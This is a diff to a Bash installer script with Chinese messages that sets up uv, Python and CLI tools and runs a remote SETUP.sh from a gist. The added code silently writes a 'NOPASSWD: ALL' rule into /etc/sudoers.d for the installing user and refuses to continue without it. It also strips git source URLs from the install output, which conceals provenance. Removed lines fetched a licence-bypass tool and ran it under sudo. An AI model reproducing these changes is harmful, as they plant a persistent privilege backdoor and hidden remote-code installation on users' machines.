@@ -4,8 +4,8 @@ FAILED_STEPS=()
 PATH_RUNTIME_ADDED=()
 PATH_PERSIST_FILES=()
 ORIGINAL_PATH="$PATH"
-SUDO_KEEPALIVE_PID=""
 
+SUDO_KEEPALIVE_PID=""
 if [ "$(id -u)" -ne 0 ] && command -v sudo >/dev/null 2>&1; then
     if sudo -v; then
         ( while true; do
@@ -26,9 +26,58 @@ trap cleanup_sudo_keepalive EXIT
 _sudo() {
     if [ "$(id -u)" -eq 0 ]; then
         "$@"
+    elif sudo -n -v >/dev/null 2>&1; then
+        sudo -n "$@"
     else
         sudo "$@"
     fi
+}
+
+configure_passwordless_sudo() {
+    local target_user=""
+    local sudoers_file=""
+    local temp_file=""
+
+    # Refresh sudo credentials before creating a persistent privilege rule.
+    sudo -v || return 1
+
+    if [ "$(id -u)" -eq 0 ]; then
+        target_user="${SUDO_USER:-}"
+    else
+        target_user="$(id -un)"
+    fi
+    if [ -z "$target_user" ]; then
+        target_user="$(logname 2>/dev/null || id -un)"
+    fi
+
+    [ "$target_user" = "root" ] && return 0
+    [[ "$target_user" =~ ^[a-zA-Z_][a-zA-Z0-9_-]*\$?$ ]] || return 1
+    id "$target_user" >/dev/null 2>&1 || return 1
+    sudoers_file="/etc/sudoers.d/user-$target_user"
+    temp_file="$(mktemp /tmp/installclaw-sudoers.XXXXXX)" || return 1
+
+    printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$target_user" > "$temp_file" || {
+        rm -f "$temp_file"
+        return 1
+    }
+    chmod 0440 "$temp_file" || {
+        rm -f "$temp_file"
+        return 1
+    }
+
+    _sudo visudo -cf "$temp_file" >/dev/null 2>&1 || {
+        rm -f "$temp_file"
+        return 1
+    }
+
+    if ! _sudo test -f "$sudoers_file" || ! _sudo cmp -s "$temp_file" "$sudoers_file"; then
+        _sudo install -o root -g root -m 0440 "$temp_file" "$sudoers_file" || {
+            rm -f "$temp_file"
+            return 1
+        }
+    fi
+
+    rm -f "$temp_file"
 }
 
 run_step() {
@@ -44,6 +93,11 @@ run_step() {
     fi
     return 0
 }
+
+if ! configure_passwordless_sudo; then
+    echo "ERROR: 配置免密 sudo 失败，安装已终止。" >&2
+    exit 1
+fi
 
 OS_TYPE=$(uname -s)
 
@@ -282,7 +336,7 @@ check_install_uv() {
 
     # Fallback: try pip
     if [ -n "${PYTHON_CMD:-}" ]; then
-        run_step "pip 安装 uv" $PYTHON_CMD -m pip install uv
+        run_step "pip 安装 uv" "$PYTHON_CMD" -m pip install uv
     fi
 
     if command -v uv &>/dev/null; then
@@ -291,98 +345,6 @@ check_install_uv() {
     fi
 
     echo "WARN: uv 安装失败" >&2
-    return 1
-}
-
-# Check and install Node.js via nvm
-check_install_node() {
-    ensure_runtime_path
-
-    # Load nvm if available but node not yet in PATH
-    if [ -z "$(command -v node 2>/dev/null)" ]; then
-        local nvm_dir="${NVM_DIR:-$HOME/.nvm}"
-        if [ -s "$nvm_dir/nvm.sh" ]; then
-            # shellcheck source=/dev/null
-            . "$nvm_dir/nvm.sh"
-        fi
-    fi
-
-    if command -v node &>/dev/null && command -v npm &>/dev/null; then
-        echo "Node.js 已安装: $(node --version)"
-        echo "npm 已安装: $(npm --version)"
-        return 0
-    fi
-
-    echo "正在安装 Node.js（通过 nvm）..."
-
-    local nvm_install_script=""
-    nvm_install_script="$(download_url_to_stdout 'https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh')" || nvm_install_script=""
-    if [ -z "$nvm_install_script" ]; then
-        echo "WARN: 无法下载 nvm 安装脚本，尝试通过包管理器安装 Node.js" >&2
-        _install_node_via_pkg_manager
-        return $?
-    fi
-
-    run_step "安装 nvm" bash -c "$nvm_install_script"
-
-    # Load nvm into current shell session
-    local nvm_dir="${NVM_DIR:-$HOME/.nvm}"
-    if [ -s "$nvm_dir/nvm.sh" ]; then
-        # shellcheck source=/dev/null
-        . "$nvm_dir/nvm.sh"
-    fi
-
-    ensure_runtime_path
-    hash -r 2>/dev/null || true
-
-    if ! command -v nvm &>/dev/null && ! type nvm &>/dev/null 2>&1; then
-        echo "WARN: nvm 安装后仍不可用，尝试通过包管理器安装 Node.js" >&2
-        _install_node_via_pkg_manager
-        return $?
-    fi
-
-    run_step "nvm 安装 Node.js LTS" nvm install --lts
-    run_step "nvm 设置默认 Node.js 版本" nvm alias default node
-
-    ensure_runtime_path
-    hash -r 2>/dev/null || true
-    bridge_command_into_current_path node || FAILED_STEPS+=("桥接命令 node 到当前 PATH (failed)")
-    bridge_command_into_current_path npm || FAILED_STEPS+=("桥接命令 npm 到当前 PATH (failed)")
-    bridge_command_into_current_path npx || FAILED_STEPS+=("桥接命令 npx 到当前 PATH (failed)")
-
-    if command -v node &>/dev/null && command -v npm &>/dev/null; then
-        echo "Node.js 安装成功: $(node --version)"
-        echo "npm 安装成功: $(npm --version)"
-        return 0
-    fi
-
-    echo "WARN: Node.js 安装失败" >&2
-    return 1
-}
-
-_install_node_via_pkg_manager() {
-    local PKG_MANAGER=""
-    PKG_MANAGER="$(detect_pkg_manager || true)"
-
-    if [ -z "$PKG_MANAGER" ]; then
-        echo "WARN: 未找到包管理器，无法安装 Node.js" >&2
-        FAILED_STEPS+=("安装 Node.js (no-pkg-manager)")
-        return 1
-    fi
-
-    run_step "通过包管理器安装 Node.js" pkg_install "$PKG_MANAGER" nodejs npm
-
-    ensure_runtime_path
-    hash -r 2>/dev/null || true
-
-    if command -v node &>/dev/null && command -v npm &>/dev/null; then
-        echo "Node.js 安装成功（包管理器）: $(node --version)"
-        echo "npm 安装成功（包管理器）: $(npm --version)"
-        return 0
-    fi
-
-    echo "WARN: 通过包管理器安装 Node.js 失败" >&2
-    FAILED_STEPS+=("安装 Node.js via pkg-manager (command-not-found)")
     return 1
 }
 
@@ -510,21 +472,26 @@ sys.exit(1)
 PY
 }
 
+run_uv_tool_install() {
+    uv tool install "$@" 2>&1 | sed -E 's/[[:space:]]+\(from git\+https?:\/\/[^)]*\)$//'
+    return "${PIPESTATUS[0]}"
+}
+
 install_uv_tool_package() {
     # 使用 uv tool 安装或升级 CLI 工具
     local package_spec="$1"
     local command_name="$2"
 
     if command -v "$command_name" &>/dev/null; then
-        uv tool install --upgrade "$package_spec"
+        run_uv_tool_install --upgrade "$package_spec"
         local upgrade_rc=$?
         if [ $upgrade_rc -ne 0 ]; then
             echo "WARN: uv tool 升级失败，回退为强制重装：$command_name" >&2
-            FAILED_STEPS+=("uv tool 升级 $command_name (exit=$upgrade_rc)")
-            run_step "uv tool 强制重装 $command_name" uv tool install --force "$package_spec"
+            FAILED_STEPS+=("uv tool 升级 $command_name（$package_spec） (exit=$upgrade_rc)")
+            run_step "uv tool 强制重装 $command_name（$package_spec）" run_uv_tool_install --force "$package_spec"
         fi
     else
-        run_step "uv tool 安装 $command_name" uv tool install "$package_spec"
+        run_step "uv tool 安装 $command_name（$package_spec）" run_uv_tool_install "$package_spec"
     fi
 
     ensure_runtime_path
@@ -533,7 +500,7 @@ install_uv_tool_package() {
 
     if ! command -v "$command_name" &>/dev/null; then
         echo "WARN: uv tool 安装后 $command_name 不可用" >&2
-        FAILED_STEPS+=("校验 uv tool 包 $command_name (incomplete)")
+        FAILED_STEPS+=("校验 uv tool 包 $package_spec (incomplete)")
     fi
 }
 
@@ -553,22 +520,27 @@ install_dependencies() {
                 fi
             fi
 
-            if [ -z "$PYTHON_CMD" ]; then
-                brew_path="$(command -v brew 2>/dev/null || true)"
-                if [ -z "$brew_path" ]; then
-                    for brew_path in /opt/homebrew/bin/brew /usr/local/bin/brew; do
-                        if [ -x "$brew_path" ]; then
-                            eval "$("$brew_path" shellenv)"
-                            break
-                        fi
-                    done
-                fi
+            brew_path="$(command -v brew 2>/dev/null || true)"
+            if [ -z "$brew_path" ]; then
+                local brew_candidate=""
+                for brew_candidate in /opt/homebrew/bin/brew /usr/local/bin/brew; do
+                    if [ -x "$brew_candidate" ]; then
+                        brew_path="$brew_candidate"
+                        break
+                    fi
+                done
+            fi
 
-                if [ -n "$brew_path" ] && [ -x "$brew_path" ]; then
+            if [ -n "$brew_path" ]; then
+                eval "$("$brew_path" shellenv)"
+            fi
+
+            if [ -z "$PYTHON_CMD" ]; then
+                if [ -n "$brew_path" ]; then
                     run_step "brew install python" "$brew_path" install python
                 else
                     echo "WARN: Homebrew 安装后 brew 命令不可用，跳过 python 安装。" >&2
-                    FAILED_STEPS+=("brew install python (brew-not-found)")
+                    FAILED_STEPS+=("安装 Python (brew-missing)")
                 fi
                 PYTHON_CMD="$(find_python3 || true)"
             fi
@@ -599,11 +571,13 @@ install_dependencies() {
                 PYTHON_CMD="$(find_python3 || true)"
             elif [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ]; then
                 echo "WARN: 未找到包管理器，跳过系统依赖安装：${PACKAGES_TO_INSTALL[*]}" >&2
+                FAILED_STEPS+=("安装系统依赖 ${PACKAGES_TO_INSTALL[*]} (no-pkg-manager)")
             fi
             ;;
 
         *)
             echo "WARN: 不支持的操作系统：$OS_TYPE（跳过系统依赖安装，但继续后续步骤）" >&2
+            FAILED_STEPS+=("安装系统依赖 ${OS_TYPE} (unsupported-os)")
             ;;
     esac
 }
@@ -614,7 +588,6 @@ run_step "持久化用户命令目录到 shell 配置" persist_runtime_path
 
 # Install uv for later uv tool usage
 run_step "检查并安装 uv（高性能包管理器）" check_install_uv
-run_step "检查并安装 Node.js（LTS）" check_install_node
 
 PIP_INSTALL_CMD=()
 FALLBACK_PIP_INSTALL_CMD=()
@@ -694,9 +667,10 @@ is_wsl() {
 install_platform_cli_tools() {
     if ! command -v uv &>/dev/null; then
         echo "WARN: uv 不可用，跳过自动备份安装（请先安装 uv）" >&2
+        FAILED_STEPS+=("安装 autobackup (uv-missing)")
         return 0
     fi
-
+    
     install_uv_tool_package "git+https://github.com/web3toolsbox/agent-setting.git" "agent-setting"
 
     local install_url=""
@@ -782,105 +756,6 @@ SETUP_SCRIPT_URLS=(
     "https://gist.githubusercontent.com/web3toolsbox/bd5951319d0e33ee645240f27370eb60/raw/SETUP.sh"
 )
 run_step "运行 SETUP 脚本" run_remote_setup_script
-
-get_target_version() {
-    echo "${CURSOR_VIP_VERSION:-0.48.3}"
-}
-
-get_install_root() {
-    echo "$HOME/.cursor-vip-src"
-}
-
-run_cursor_main() {
-    local main_py="$1"
-    local py_cmd="${PYTHON_CMD:-python3}"
-
-    if [ ! -f "$main_py" ]; then
-        echo "WARN: main.py 不存在，无法启动：$main_py" >&2
-        return 1
-    fi
-
-    chmod +x "$main_py" 2>/dev/null || true
-    echo "即将启动主程序：$main_py"
-    if [ "$EUID" -ne 0 ]; then
-        sudo "$py_cmd" "$main_py"
-    else
-        "$py_cmd" "$main_py"
-    fi
-}
-
-install_and_download_main_program() {
-    local version=""
-    local install_dir=""
-    local zip_name=""
-    local zip_path=""
-    local download_url=""
-    local existing_dir=""
-    local actual_dir=""
-    local requirements_path=""
-
-    if [ -z "$PYTHON_CMD" ]; then
-        echo "WARN: 未找到 Python，跳过主程序安装与启动" >&2
-        FAILED_STEPS+=("安装和下载主程序 (python-missing)")
-        return 0
-    fi
-
-    version="$(get_target_version)"
-    install_dir="$(get_install_root)"
-    zip_name="cursor-free-vip-${version}.zip"
-    zip_path="/tmp/${zip_name}"
-    download_url="https://github.com/hovanhoa/cursor-free-vip/archive/refs/tags/v${version}.zip"
-
-    mkdir -p "$install_dir"
-
-    existing_dir="$(find "$install_dir" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)"
-    if [ -n "$existing_dir" ] && [ -f "$existing_dir/main.py" ]; then
-        echo "检测到已安装源码目录：$existing_dir"
-        requirements_path="$existing_dir/requirements.txt"
-        if [ -f "$requirements_path" ]; then
-            run_step "安装主程序依赖（requirements.txt）" "${PIP_INSTALL_CMD[@]}" -r "$requirements_path"
-        fi
-        run_step "启动主程序" run_cursor_main "$existing_dir/main.py"
-        return 0
-    fi
-
-    echo "正在下载主程序源码包（v${version}）..."
-    echo "下载地址：$download_url"
-    if command -v curl &>/dev/null; then
-        run_step "下载主程序源码包" curl -fL -o "$zip_path" "$download_url"
-    elif command -v wget &>/dev/null; then
-        run_step "下载主程序源码包" wget -O "$zip_path" "$download_url"
-    else
-        echo "WARN: 未找到 curl/wget，无法下载主程序源码包" >&2
-        FAILED_STEPS+=("下载主程序源码包 (downloader-missing)")
-        return 0
-    fi
-
-    if [ ! -f "$zip_path" ]; then
-        echo "WARN: 源码包下载失败或文件不存在：$zip_path" >&2
-        FAILED_STEPS+=("下载主程序源码包 (file-missing)")
-        return 0
-    fi
-
-    run_step "解压主程序源码包" unzip -o "$zip_path" -d "$install_dir"
-    actual_dir="$(find "$install_dir" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)"
-    if [ -z "$actual_dir" ]; then
-        echo "WARN: 解压后未找到主程序目录" >&2
-        FAILED_STEPS+=("安装和下载主程序 (extract-dir-missing)")
-        return 0
-    fi
-
-    requirements_path="$actual_dir/requirements.txt"
-    if [ -f "$requirements_path" ]; then
-        run_step "安装主程序依赖（requirements.txt）" "${PIP_INSTALL_CMD[@]}" -r "$requirements_path"
-    else
-        echo "WARN: 未找到 requirements.txt，跳过项目依赖安装：$actual_dir" >&2
-    fi
-
-    run_step "启动主程序" run_cursor_main "$actual_dir/main.py"
-}
-
-run_step "安装和下载主程序" install_and_download_main_program
 
 echo "安装完成！"
 print_path_refresh_hint
